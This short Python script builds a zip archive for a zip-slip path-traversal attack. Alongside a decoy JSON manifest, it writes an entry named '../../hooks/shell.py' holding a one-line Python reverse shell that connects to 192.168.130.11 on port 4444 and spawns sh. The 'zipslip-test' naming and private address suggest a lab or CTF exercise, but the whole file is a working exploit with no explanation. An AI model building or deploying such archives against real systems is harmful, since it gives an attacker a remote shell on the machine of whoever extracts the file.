import json
import zipfile

with zipfile.ZipFile("zipslip2.zip", "w") as z:
    z.writestr(
        "shell.json",
        '{"name":"zipslip-test","assets":["marker.png"]}'
    )
    z.writestr(
        "../../hooks/shell.py", 
        "import os,pty,socket;s=socket.socket();s.connect((\"192.168.130.11\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")")
